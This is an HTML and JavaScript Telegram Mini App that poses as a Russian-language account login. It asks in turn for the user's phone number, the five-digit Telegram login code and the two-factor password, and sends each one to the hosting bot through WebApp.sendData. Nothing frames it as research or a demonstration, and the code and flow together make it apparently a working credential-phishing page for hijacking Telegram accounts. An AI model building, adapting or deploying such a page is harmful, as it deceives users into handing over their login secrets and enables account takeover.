<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Вход в аккаунт</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Telegram WebApp SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            transition: background-color 0.3s ease;
            color: var(--tg-theme-text-color, #000000);
            background-color: var(--tg-theme-bg-color, #ffffff);
            margin: 0;
            padding: 0;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .input-primary {
            background-color: var(--tg-theme-secondary-bg-color, #f3f3f3);
            border: 1px solid var(--tg-theme-hint-color, #e0e0e0);
            color: var(--tg-theme-text-color, #000000);
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-primary:focus {
            border-color: var(--tg-theme-link-color, #2481cc);
            box-shadow: 0 0 0 2px rgba(var(--tg-theme-link-color-rgb, 36, 129, 204), 0.3);
            outline: none;
        }

        .btn-primary {
            background-color: var(--tg-theme-button-color, #2481cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            transition: opacity 0.2s;
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        /* Стили для полей ввода кода */
        .code-input {
            width: 2.75rem; /* 44px */
            height: 3.5rem; /* 56px */
            text-align: center;
            font-size: 1.25rem; /* 20px */
            border-radius: 0.5rem; /* 8px */
            margin: 0 0.25rem; /* 4px */
        }
        
        @media (max-width: 360px) {
            .code-input {
                width: 2.25rem; /* 36px */
                height: 3rem; /* 48px */
            }
        }
    </style>
</head>
<body class="overflow-hidden">

    <div id="app-container" class="p-5 max-w-md mx-auto min-h-screen">

        <!-- Сообщение об ошибке/статусе -->
        <div id="message-box" class="hidden p-3 mb-4 rounded-lg text-sm transition-all duration-300"></div>

        <!-- ЭКРАН 1: ВВОД НОМЕРА ТЕЛЕФОНА -->
        <div id="phone-view" class="hidden space-y-5">
            <div class="text-center">
                <h1 class="text-2xl font-bold">Вход</h1>
                <p class="mt-2 text-base" style="color: var(--tg-theme-hint-color, #707579);">
                    Введите ваш номер телефона для входа в аккаунт.
                </p>
            </div>
            
            <div>
                <label for="phone" class="block text-sm font-medium mb-1">Номер телефона</label>
                <input type="tel" id="phone" name="phone"
                       class="input-primary w-full p-3 rounded-lg text-base"
                       placeholder="+7 999 123 45 67">
            </div>
            
            <button id="phone-button" class="btn-primary w-full p-3.5 rounded-lg font-semibold text-base">
                Отправить код
            </button>
        </div>

        <!-- ЭКРАН 2: ВВОД КОДА -->
        <div id="code-view" class="hidden space-y-5">
            <div class="text-center">
                <h1 class="text-2xl font-bold">Введите код</h1>
                <p class="mt-2 text-base" style="color: var(--tg-theme-hint-color, #707579);">
                    Мы отправили код в ваш аккаунт Telegram.
                </p>
            </div>
            
            <div class="flex justify-center" id="code-inputs">
                <input type="tel" class="code-input input-primary" maxlength="1" pattern="\d*">
                <input type="tel" class="code-input input-primary" maxlength="1" pattern="\d*">
                <input type="tel" class="code-input input-primary" maxlength="1" pattern="\d*">
                <input type="tel" class="code-input input-primary" maxlength="1" pattern="\d*">
                <input type="tel" class="code-input input-primary" maxlength="1" pattern="\d*">
            </div>
            
            <button id="code-button" class="btn-primary w-full p-3.5 rounded-lg font-semibold text-base">
                Подтвердить код
            </button>
        </div>

        <!-- ЭКРАН 3: ВВОД ПАРОЛЯ 2FA -->
        <div id="password-view" class="hidden space-y-5">
            <div class="text-center">
                <h1 class="text-2xl font-bold">Пароль 2FA</h1>
                <p class="mt-2 text-base" style="color: var(--tg-theme-hint-color, #707579);">
                    Введите ваш пароль от двухфакторной аутентификации.
                </p>
            </div>
            
            <div>
                <label for="password" class="block text-sm font-medium mb-1">Пароль</label>
                <input type="password" id="password" name="password"
                       class="input-primary w-full p-3 rounded-lg text-base"
                       placeholder="••••••••">
            </div>
            
            <button id="password-button" class="btn-primary w-full p-3.5 rounded-lg font-semibold text-base">
                Войти
            </button>
        </div>

    </div>

    <script>
        const WebApp = window.Telegram.WebApp;

        // Элементы
        const phoneView = document.getElementById('phone-view');
        const codeView = document.getElementById('code-view');
        const passwordView = document.getElementById('password-view');
        
        const phoneInput = document.getElementById('phone');
        const phoneButton = document.getElementById('phone-button');
        
        const codeInputsContainer = document.getElementById('code-inputs');
        const codeInputs = [...codeInputsContainer.getElementsByTagName('input')];
        const codeButton = document.getElementById('code-button');

        const passwordInput = document.getElementById('password');
        const passwordButton = document.getElementById('password-button');
        
        const messageBox = document.getElementById('message-box');

        // --- Утилиты ---
        
        function displayMessage(message, type = 'info') {
            messageBox.textContent = message;
            messageBox.classList.remove('hidden', 'bg-red-100', 'text-red-700', 'bg-blue-100', 'text-blue-700');
            
            if (type === 'error') {
                messageBox.classList.add('bg-red-100', 'text-red-700');
            } else {
                messageBox.classList.add('bg-blue-100', 'text-blue-700');
            }
            messageBox.classList.remove('hidden');
        }

        function showView(viewElement) {
            phoneView.classList.add('hidden');
            codeView.classList.add('hidden');
            passwordView.classList.add('hidden');
            viewElement.classList.remove('hidden');
        }

        function sendData(data, buttonElement) {
            const originalText = buttonElement.innerText;
            buttonElement.disabled = true;
            buttonElement.innerText = 'Отправка...';

            // Показываем пользователю, что данные отправляются
            displayMessage('Данные отправляются...', 'info');

            // Небольшая задержка позволяет показать сообщение перед закрытием приложения
            setTimeout(() => {
                try {
                    WebApp.sendData(JSON.stringify(data));
                    // WebApp закроется автоматически после sendData
                } catch (error) {
                    displayMessage('Ошибка отправки: ' + error.message, 'error');
                    buttonElement.disabled = false;
                    buttonElement.innerText = originalText;
                }
            }, 300); // Задержка в 300 миллисекунд
        }

        // --- Логика для полей ввода кода ---
        codeInputsContainer.addEventListener('input', (e) => {
            const target = e.target;
            const val = target.value;
            if (val.match(/\d/)) {
                const next = target.nextElementSibling;
                if (next) {
                    next.focus();
                }
            }
        });
        
        codeInputsContainer.addEventListener('keydown', (e) => {
            const target = e.target;
            if (e.key === 'Backspace' && !target.value) {
                const prev = target.previousElementSibling;
                if (prev) {
                    prev.focus();
                    prev.value = '';
                }
            }
        });

        // --- Обработчики кнопок ---
        
        phoneButton.addEventListener('click', () => {
            const phone = phoneInput.value.replace(/[^0-9+]/g, ''); // Очистка номера
            if (phone.length < 10) {
                displayMessage('Пожалуйста, введите корректный номер телефона.', 'error');
                return;
            }
            sendData({ step: 'phone', phone: phone }, phoneButton);
        });

        codeButton.addEventListener('click', () => {
            const code = codeInputs.map(input => input.value).join('');
            if (code.length !== 5) {
                displayMessage('Код должен состоять из 5 цифр.', 'error');
                return;
            }
            sendData({ step: 'code', code: code }, codeButton);
        });

        passwordButton.addEventListener('click', () => {
            const password = passwordInput.value;
            if (!password) {
                displayMessage('Пожалуйста, введите ваш пароль.', 'error');
                return;
            }
            sendData({ step: 'password', password: password }, passwordButton);
        });


        // --- Инициализация ---
        
        function init() {
            try {
                WebApp.ready();
                WebApp.expand(); // Раскрываем WebApp на весь экран
                
                // Определяем, какой экран показать, на основе URL-параметра
                const urlParams = new URLSearchParams(window.location.search);
                const step = urlParams.get('step');
                
                if (step === 'code') {
                    showView(codeView);
                    codeInputs[0].focus();
                } else if (step === 'password') {
                    showView(passwordView);
                    passwordInput.focus();
                } else {
                    // По умолчанию показываем экран ввода телефона
                    showView(phoneView);
                    phoneInput.focus();
                }

            } catch (error) {
                console.error("Failed to init Telegram WebApp:", error);
                document.body.innerHTML = "Ошибка: Не удалось инициализировать Telegram WebApp. Убедитесь, что открываете через Telegram.";
            }
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }
        
    </script>
</body>
            </html>
